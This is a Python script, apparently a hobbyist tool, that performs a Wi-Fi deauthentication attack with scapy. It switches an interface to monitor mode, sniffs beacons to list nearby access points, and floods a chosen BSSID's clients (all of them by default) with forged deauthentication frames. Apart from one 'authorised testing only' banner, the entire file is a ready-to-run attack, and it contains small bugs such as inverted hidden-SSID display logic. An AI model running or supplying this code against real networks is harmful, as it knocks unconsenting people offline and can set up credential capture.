#built for linux mint
import os
import sys
import time
import subprocess #for sys commands like iwconfig
from collections import defaultdict #stores APs found
import argparse
from scapy.all import Dot11, Dot11Deauth, RadioTap, sniff, sendp, conf, Dot11Beacon, Dot11Elt #the pride and joy of this code

#might add colorama bits if i add it to the cybersec repo
def clearScreen():
    os.system('cls' if os.name == 'nt' else 'clear')

#puts specific wireless interface into monitor mode
def setMonitorMode(interface):
    print(f"attempting to put {interface} into monitor mode...")

    try:
        #check if the interface is even there and if its up
        subprocess.run(['ip', 'link', 'show', interface], check = True, capture_output = True)

        #bring interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check = True)
        print(f"{interface} brought down.")

        #set monitor mode with beloved iw
        subprocess.run(['iw', interface, 'set', 'monitor', 'none'], check = True)
        print(f"{interface} set to monitor mode.")
        time.sleep(1)

        #bring interface up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check = True)
        print(f"{interface} brought up.")

        print(f"{interface} is now in *monitor* mode. ready for sniffing/injection (the fun stuff).")
        return True
    
    except subprocess.CalledProcessError as e:
        print(f"failed to set monitor mode for {interface}. error: {e}.")
        print(f"ensure you have 'iw' installed and your running as sudo.")
        return False
    except FileNotFoundError:
        print("'iw' not found. ensure net-tools/iproute2/iw is installed.")
        return False
    except Exception as e:
        print(f"a weird error occured: {e}.")
        return False
    
#returns the specified wireless interface to managed mode    
def setManagedMode(interface):
    print(f"attempting to return {interface} to managed mode...")

    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check = True)
        time.sleep(1)

        subprocess.run(['iw', interface, 'set', 'type', 'managed'], check = True)
        time.sleep(1)

        subprocess.run(['ip', 'link', 'set', interface, 'up'], check = True)
        print(f"{interface} returned to managed mode...")
        return True
    except subprocess.CalledProcessError as e:
        print(f"failed to set managed mode for {interface}. error: {e}.")
        print(f"you might need to manually set it back or reboot with: sudo reboot.")
        return False
    except FileNotFoundError:
        print("'iw' command not found. please install it.")
        return False
    except Exception as e:
        print(f"an unexpected error occured: {e}.")
        return False
    
detectedAPs = defaultdict(dict)
    
#callback function for scapy sniff to process the beacon frames
def beaconSnifferCallback(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode(errors = 'ignore')
        channel = None

        try:
            dsParamSet = packet.getlayer(Dot11Elt, ID = 3)
            if dsParamSet:
                channel = dsParamSet.info[0]
        except Exception:
            pass

        if bssid not in detectedAPs:
            detectedAPs[bssid] = {'ssid': ssid if ssid else '<Hidden SSID>', 'channel': channel if channel is not None else 'Unknown'}
            print(f"[AP] BSSID: {bssid} | SSID: {ssid if not ssid else '<Hidden SSID'} | Chennel: {detectedAPs[bssid]['channel']}")

#sniffs for wifi access points and returns a selected bssid
def detectBSSID(interface, timeout = 10):
    print(f"sniffing for access points on {interface} for {timeout} seconds.")
    print("waiting for beacon frames... be patient.")

    detectedAPs.clear()

    try:
        sniff(iface = interface, prn = beaconSnifferCallback, timeout = timeout, store = 0)
    except Exception as e:
        print(f"error during sniffing: {e}.")
        print(f"make sure {interface} is in monitor mode and you are running as sudo.")
        return None
    
    if not detectedAPs:
        print("no access points detected. maybe increase the timeout or check for interference.")
        return None
    
    print("detected access points: ")
    apList = []
    for i, (bssid, info) in enumerate(detectedAPs.items(), 1):
        apList.append((bssid, info))
        print(f" {i}. BSSID: {bssid} | SSID: {info['ssid']} | Channel: {info['channel']}")

    while True:
        choice = input("enter the nummber of the target AP: ")
        
        try:
            choiceIdx = int(choice) - 1
            if 0 <= choiceIdx < len(apList):
                selectedBSSID, selectedInfo = apList[choiceIdx]
                print(f"selected AP: BSSID {selectedBSSID} | SSID: {selectedInfo['ssid']}")
                return selectedBSSID
            else:
                print("invalid number. please select from the list.")
        except ValueError:
            print("invalid input. enter a number.")

#deauth attack - fun fact, this is mainly due to an IEEE standard integrated into wifi protocols, where one of the frame types includes deauthentication
def deauthAttack(interface, targetBSSID, clientMAC = "FF:FF:FF:FF:FF:FF", packetsToSend = 100, interval = 0.1):
    print(f"initiating deauthentication attack on: {targetBSSID}.")
    print(f"client: {clientMAC}")
    print(f"interface: {interface} | Packets: {packetsToSend} | interval: {interval}s.")

    dot11Deauth = Dot11(addr1 = clientMAC, addr2 = targetBSSID, addr3 = targetBSSID, type = 0, subtype = 12)
    deauthFrame = RadioTap() / dot11Deauth / Dot11Deauth(reason=7)

    print("sending deauthentication packets...")

    try:
        sendp(deauthFrame, iface = interface, count = packetsToSend, inter = interval, verbose = False)
    except Exception as e:
        print(f"error sending packets: {e}.")
        print(f"make sure {interface} is in monitor mode and your running as sudo...")

#main function to run the attack
def runDeauthAttack(args):
    print("wifi deauthentication attack :)")
    print("warning - this is really disruptive, only use in AUTHORISED testing settings...")
    print("requires your wireless adapter to support monitor mode, and running this as root.")

    interface = input("enter wireless interface name (like wlan0, wlan0mon, etc)")
    if not interface:
        print("no interface entered... exiting.")
        input("press enter to return....")
        return
    
    if not setMonitorMode(interface):
        print("failed to put interface into monitor mode. cannot proceed.")
        input("press enter to return...")

    try:
        targetBSSID = detectBSSID(interface)
        if not targetBSSID:
            print("no target AP selected. cannot proceed.")
            return
        
        clientMACChoice = input("attack specific client (leave blank to broadcast to all AP clients): ")
        clientMAC = clientMACChoice if clientMACChoice else "FF:FF:FF:FF:FF:FF"

        try:
            packetsToSend = int(input("number of deauth packets to send (e.g. 100): "))
            interval = float(input("interval between packets in seconds (e.g. 0.1): "))

        except ValueError:
            print("invalid number or interval. using default (100 packets).")
            packetsToSend = 100
            interval = 0.1

        deauthAttack(interface, targetBSSID, clientMAC, packetsToSend, interval)

    finally:
        setManagedMode(interface)
        input("press enter to return to menu")


runDeauthAttack(None)


















